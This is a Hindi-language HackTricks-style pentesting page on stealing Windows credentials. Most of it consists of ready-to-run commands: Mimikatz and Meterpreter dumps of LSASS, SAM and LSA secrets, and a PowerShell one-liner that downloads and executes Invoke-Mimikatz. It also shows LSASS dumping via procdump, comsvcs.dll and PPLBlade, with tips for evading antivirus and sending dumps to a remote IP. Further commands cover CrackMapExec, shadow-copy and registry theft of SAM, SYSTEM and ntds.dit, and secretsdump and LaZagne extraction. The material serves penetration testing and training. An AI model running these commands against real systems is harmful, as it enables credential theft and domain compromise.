# Windows क्रेडेंशियल चुराना

{{#include ../../banners/hacktricks-training.md}}

## क्रेडेंशियल्स Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Mimikatz कर सकते हैं अन्य चीजें खोजें** [**इस पृष्ठ पर**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**यहाँ कुछ संभावित क्रेडेंशियल सुरक्षा के बारे में जानें।**](credentials-protections.md) **यह सुरक्षा Mimikatz को कुछ क्रेडेंशियल निकालने से रोक सकती है।**

## मीटरप्रेटर के साथ क्रेडेंशियल्स

[**क्रेडेंशियल्स प्लगइन**](https://github.com/carlospolop/MSF-Credentials) **का उपयोग करें जो मैंने** **शिकार के अंदर पासवर्ड और हैश खोजने के लिए** **बनाया है।**
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AV को बायपास करना

### Procdump + Mimikatz

चूंकि **Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**एक वैध Microsoft टूल है**, इसे Defender द्वारा नहीं पहचाना जाता।\
आप इस टूल का उपयोग **lsass प्रक्रिया को डंप करने**, **डंप डाउनलोड करने** और **डंप से** **स्थानीय रूप से क्रेडेंशियल्स निकालने** के लिए कर सकते हैं।
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
यह प्रक्रिया स्वचालित रूप से [SprayKatz](https://github.com/aas-n/spraykatz) के साथ की जाती है: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**नोट**: कुछ **AV** **malicious** के रूप में **detect** कर सकते हैं **procdump.exe to dump lsass.exe** का उपयोग करना, यह इसलिए है क्योंकि वे **"procdump.exe" और "lsass.exe"** स्ट्रिंग का **detect** कर रहे हैं। इसलिए **lsass.exe** के **PID** को procdump को **argument** के रूप में **pass** करना **stealthier** है **name lsass.exe** के बजाय।

### **comsvcs.dll** के साथ lsass को डंप करना

एक DLL जिसका नाम **comsvcs.dll** है, `C:\Windows\System32` में पाया जाता है, यह एक क्रैश की स्थिति में **dumping process memory** के लिए जिम्मेदार है। इस DLL में एक **function** है जिसका नाम **`MiniDumpW`** है, जिसे `rundll32.exe` का उपयोग करके बुलाने के लिए डिज़ाइन किया गया है।\
पहले दो arguments का उपयोग करना अप्रासंगिक है, लेकिन तीसरा एक तीन घटकों में विभाजित है। डंप किए जाने वाले प्रक्रिया ID पहले घटक का निर्माण करता है, डंप फ़ाइल स्थान दूसरे का प्रतिनिधित्व करता है, और तीसरा घटक सख्ती से शब्द **full** है। कोई वैकल्पिक विकल्प नहीं हैं।\
इन तीन घटकों को पार्स करने पर, DLL डंप फ़ाइल बनाने और निर्दिष्ट प्रक्रिया की मेमोरी को इस फ़ाइल में स्थानांतरित करने में संलग्न होता है।\
**comsvcs.dll** का उपयोग lsass प्रक्रिया को डंप करने के लिए किया जा सकता है, जिससे procdump को अपलोड और निष्पादित करने की आवश्यकता समाप्त हो जाती है। इस विधि का विस्तृत विवरण [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) पर दिया गया है।

निष्पादन के लिए निम्नलिखित आदेश का उपयोग किया जाता है:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**आप इस प्रक्रिया को** [**lssasy**](https://github.com/Hackndo/lsassy)** के साथ स्वचालित कर सकते हैं।**

### **टास्क मैनेजर के साथ lsass को डंप करना**

1. टास्क बार पर राइट-क्लिक करें और टास्क मैनेजर पर क्लिक करें
2. अधिक विवरण पर क्लिक करें
3. प्रक्रियाओं के टैब में "लोकल सिक्योरिटी अथॉरिटी प्रोसेस" प्रक्रिया के लिए खोजें
4. "लोकल सिक्योरिटी अथॉरिटी प्रोसेस" प्रक्रिया पर राइट-क्लिक करें और "डंप फ़ाइल बनाएं" पर क्लिक करें।

### procdump के साथ lsass को डंप करना

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) एक माइक्रोसॉफ्ट द्वारा साइन किया गया बाइनरी है जो [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) सूट का एक हिस्सा है।
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass with PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) एक Protected Process Dumper Tool है जो मेमोरी डंप को छिपाने और इसे दूरस्थ कार्यस्थानों पर बिना डिस्क पर गिराए स्थानांतरित करने का समर्थन करता है।

**मुख्य कार्यक्षमताएँ**:

1. PPL सुरक्षा को बायपास करना
2. Defender सिग्नेचर-आधारित पहचान तंत्र से बचने के लिए मेमोरी डंप फ़ाइलों को छिपाना
3. RAW और SMB अपलोड विधियों के साथ मेमोरी डंप को बिना डिस्क पर गिराए अपलोड करना (फाइललेस डंप)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## CrackMapExec

### SAM हैशेस डंप करें
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### LSA रहस्यों को डंप करें
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### लक्ष्य DC से NTDS.dit डंप करें
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### लक्षित DC से NTDS.dit पासवर्ड इतिहास डंप करें
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### प्रत्येक NTDS.dit खाते के लिए pwdLastSet विशेषता दिखाएँ
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

ये फ़ाइलें **स्थित** होनी चाहिए _C:\windows\system32\config\SAM_ और _C:\windows\system32\config\SYSTEM._ लेकिन **आप उन्हें सामान्य तरीके से कॉपी नहीं कर सकते** क्योंकि वे सुरक्षित हैं।

### From Registry

उन फ़ाइलों को चुराने का सबसे आसान तरीका रजिस्ट्री से एक कॉपी प्राप्त करना है:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**डाउनलोड** करें उन फ़ाइलों को अपने Kali मशीन पर और **हैशेस निकालें** का उपयोग करके:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

आप इस सेवा का उपयोग करके संरक्षित फ़ाइलों की कॉपी कर सकते हैं। आपको व्यवस्थापक होना आवश्यक है।

#### Using vssadmin

vssadmin बाइनरी केवल Windows Server संस्करणों में उपलब्ध है।
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
लेकिन आप **Powershell** से भी यही कर सकते हैं। यह **SAM फ़ाइल को कॉपी करने का एक उदाहरण** है (उपयोग किया गया हार्ड ड्राइव "C:" है और इसे C:\users\Public में सहेजा गया है) लेकिन आप इसका उपयोग किसी भी सुरक्षित फ़ाइल को कॉपी करने के लिए कर सकते हैं:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

अंत में, आप [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) का उपयोग करके SAM, SYSTEM और ntds.dit की एक प्रति बना सकते हैं।
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **एक्टिव डायरेक्टरी क्रेडेंशियल्स - NTDS.dit**

**NTDS.dit** फ़ाइल को **एक्टिव डायरेक्टरी** का दिल माना जाता है, जो उपयोगकर्ता वस्तुओं, समूहों और उनकी सदस्यताओं के बारे में महत्वपूर्ण डेटा रखती है। यह वह जगह है जहाँ डोमेन उपयोगकर्ताओं के **पासवर्ड हैश** संग्रहीत होते हैं। यह फ़ाइल एक **Extensible Storage Engine (ESE)** डेटाबेस है और **_%SystemRoom%/NTDS/ntds.dit_** पर स्थित है।

इस डेटाबेस में तीन प्रमुख तालिकाएँ रखी जाती हैं:

- **डेटा तालिका**: यह तालिका उपयोगकर्ताओं और समूहों जैसी वस्तुओं के बारे में विवरण संग्रहीत करने का कार्य करती है।
- **लिंक तालिका**: यह संबंधों का ट्रैक रखती है, जैसे समूह सदस्यताएँ।
- **SD तालिका**: प्रत्येक वस्तु के लिए **सुरक्षा विवरण** यहाँ रखे जाते हैं, जो संग्रहीत वस्तुओं के लिए सुरक्षा और पहुँच नियंत्रण सुनिश्चित करते हैं।

इस बारे में अधिक जानकारी: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows उस फ़ाइल के साथ बातचीत करने के लिए _Ntdsa.dll_ का उपयोग करता है और इसका उपयोग _lsass.exe_ द्वारा किया जाता है। फिर, **NTDS.dit** फ़ाइल का **भाग** **`lsass`** मेमोरी के अंदर स्थित हो सकता है (आप शायद प्रदर्शन सुधार के कारण **कैश** का उपयोग करके हाल ही में एक्सेस किए गए डेटा को पा सकते हैं)।

#### NTDS.dit के अंदर हैश को डिक्रिप्ट करना

हैश को 3 बार सिफर किया जाता है:

1. **PEK** (पासवर्ड एन्क्रिप्शन कुंजी) को **BOOTKEY** और **RC4** का उपयोग करके डिक्रिप्ट करें।
2. **PEK** और **RC4** का उपयोग करके **हैश** को डिक्रिप्ट करें।
3. **DES** का उपयोग करके **हैश** को डिक्रिप्ट करें।

**PEK** का **हर डोमेन कंट्रोलर** में **एक ही मान** होता है, लेकिन यह **NTDS.dit** फ़ाइल के अंदर **डोमेन कंट्रोलर के SYSTEM फ़ाइल के BOOTKEY** का उपयोग करके **सिफर** किया जाता है (जो डोमेन कंट्रोलरों के बीच भिन्न होता है)। यही कारण है कि NTDS.dit फ़ाइल से क्रेडेंशियल प्राप्त करने के लिए **आपको NTDS.dit और SYSTEM फ़ाइल की आवश्यकता है** (_C:\Windows\System32\config\SYSTEM_)।

### Ntdsutil का उपयोग करके NTDS.dit की कॉपी करना

Windows Server 2008 से उपलब्ध।
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
आप [**वॉल्यूम शैडो कॉपी**](./#stealing-sam-and-system) ट्रिक का उपयोग करके **ntds.dit** फ़ाइल को कॉपी कर सकते हैं। याद रखें कि आपको **SYSTEM फ़ाइल** की एक कॉपी भी चाहिए होगी (फिर से, [**इसे रजिस्ट्री से डंप करें या वॉल्यूम शैडो कॉपी**](./#stealing-sam-and-system) ट्रिक का उपयोग करें)।

### **NTDS.dit से हैश निकालना**

एक बार जब आपके पास **NTDS.dit** और **SYSTEM** फ़ाइलें **प्राप्त** हो जाएं, तो आप _secretsdump.py_ जैसे टूल का उपयोग करके **हैश निकाल सकते हैं**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
आप उन्हें **स्वचालित रूप से निकाल सकते हैं** एक मान्य डोमेन प्रशासन उपयोगकर्ता का उपयोग करके:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
बड़े **NTDS.dit फ़ाइलों** के लिए, इसे [gosecretsdump](https://github.com/c-sto/gosecretsdump) का उपयोग करके निकालने की सिफारिश की जाती है।

अंत में, आप **metasploit मॉड्यूल** का भी उपयोग कर सकते हैं: _post/windows/gather/credentials/domain_hashdump_ या **mimikatz** `lsadump::lsa /inject`

### **NTDS.dit से SQLite डेटाबेस में डोमेन ऑब्जेक्ट्स निकालना**

NTDS ऑब्जेक्ट्स को [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) के साथ SQLite डेटाबेस में निकाला जा सकता है। न केवल रहस्य निकाले जाते हैं बल्कि पूरे ऑब्जेक्ट्स और उनकी विशेषताएँ भी निकाली जाती हैं ताकि कच्ची NTDS.dit फ़ाइल पहले से प्राप्त होने पर आगे की जानकारी निकाली जा सके।
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` हाइव वैकल्पिक है लेकिन यह रहस्यों के डिक्रिप्शन की अनुमति देता है (NT & LM हैश, सप्लीमेंटल क्रेडेंशियल्स जैसे कि क्लियरटेक्स्ट पासवर्ड, kerberos या ट्रस्ट की, NT & LM पासवर्ड इतिहास)। अन्य जानकारी के साथ, निम्नलिखित डेटा निकाला जाता है: उपयोगकर्ता और मशीन खाते उनके हैश के साथ, UAC फ्लैग, अंतिम लॉगिन और पासवर्ड परिवर्तन के लिए टाइमस्टैम्प, खातों का विवरण, नाम, UPN, SPN, समूह और पुनरावृत्त सदस्यताएँ, संगठनात्मक इकाइयों का पेड़ और सदस्यता, विश्वसनीय डोमेन जिनमें ट्रस्ट का प्रकार, दिशा और विशेषताएँ शामिल हैं...

## Lazagne

बाइनरी [यहाँ](https://github.com/AlessandroZ/LaZagne/releases) से डाउनलोड करें। आप इस बाइनरी का उपयोग कई सॉफ़्टवेयर से क्रेडेंशियल्स निकालने के लिए कर सकते हैं।
```
lazagne.exe all
```
## SAM और LSASS से क्रेडेंशियल्स निकालने के लिए अन्य उपकरण

### Windows credentials Editor (WCE)

यह उपकरण मेमोरी से क्रेडेंशियल्स निकालने के लिए उपयोग किया जा सकता है। इसे डाउनलोड करें: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM फ़ाइल से क्रेडेंशियल्स निकालें
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAM फ़ाइल से क्रेडेंशियल्स निकालें
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

इसे डाउनलोड करें: [ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) और बस **इसे चलाएँ** और पासवर्ड निकाले जाएंगे।

## Defenses

[**यहाँ कुछ क्रेडेंशियल सुरक्षा के बारे में जानें।**](credentials-protections.md)

{{#include ../../banners/hacktricks-training.md}}
